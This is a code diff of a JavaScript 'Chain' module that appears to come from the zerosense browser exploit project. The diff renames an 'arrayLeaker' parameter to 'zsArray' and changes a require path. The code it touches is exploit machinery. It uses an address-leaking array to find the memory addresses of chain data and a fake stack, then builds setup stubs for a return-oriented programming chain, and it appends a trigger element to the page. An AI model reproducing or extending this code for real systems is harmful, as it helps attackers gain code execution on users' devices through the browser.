@@ -1,8 +1,10 @@
 /*eslint-disable no-param-reassign */
 
-var Util = require('zerosense/Util');
+var Util = require('./Util.js');
+
 
 var trigger = document.body.appendChild(document.createElement("div"));
+
 
 class Chain {
 	
@@ -64,27 +66,27 @@ class Chain {
 		return Util.int32(addr);
 	}
 	
-	prepare(arrayLeaker) {	
-		var addrData = arrayLeaker.getAddress(this.cb.getData());
+	prepare(zsArray) {	
+		var addrData = zsArray.getAddress(this.cb.getData());
 		if (addrData === null) {
 			throw new Error("Failed to get chain data address.");
 		}
 		this.cb.updateDataAddress(addrData);
 		
-		var addrStack = arrayLeaker.getAddress(this.cb.getChain());
+		var addrStack = zsArray.getAddress(this.cb.getChain());
 		if (addrStack === null) {
 			throw new Error("Failed to get chain stack address.");
 		}
 		var chainStackOffset = 0x4;
 		
 		var setup2 = this.setup2Make(addrStack + chainStackOffset);
-		var addrSetup2 = arrayLeaker.getAddress(setup2);
+		var addrSetup2 = zsArray.getAddress(setup2);
 		if (addrSetup2 === null) {
 			throw new Error("Failed to get setup2 address.");
 		}
 		
 		var setup1 = this.setup1Make(addrSetup2);
-		var addrSetup1 = arrayLeaker.getAddress(setup1);
+		var addrSetup1 = zsArray.getAddress(setup1);
 		if (addrSetup1 === null) {
 			throw new Error("Failed to get setup1 address.");
 		}
@@ -105,5 +107,6 @@ class Chain {
 	}
 	
 }
+
 
 module.exports = Chain;
